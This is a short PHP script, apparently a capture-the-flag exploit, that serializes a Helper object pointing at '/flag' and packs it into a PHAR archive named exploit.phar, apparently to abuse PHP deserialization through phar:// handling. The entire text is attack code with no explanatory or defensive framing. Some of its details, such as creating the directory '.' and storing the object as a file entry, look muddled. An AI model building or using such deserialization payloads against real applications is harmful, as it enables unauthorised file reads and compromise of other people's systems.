<?php
class Helper {
    public string $file = '/flag';
}

// Create a directory for our PHAR
$phar_dir = '.';
if (!file_exists($phar_dir)) {
    mkdir($phar_dir);
}

// Serialize our modified Helper object
$serialized_helper = serialize(new Helper());

// Create the magic file
file_put_contents($phar_dir . '/magic_happens_here', $serialized_helper);

// Create the PHAR
$phar_file = $phar_dir . '/exploit.phar';
$phar = new Phar($phar_file);
$phar->startBuffering();
$phar->addFromString('magic_happens_here', $serialized_helper);
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();

echo "Exploit PHAR created at: $phar_file\n";
?>
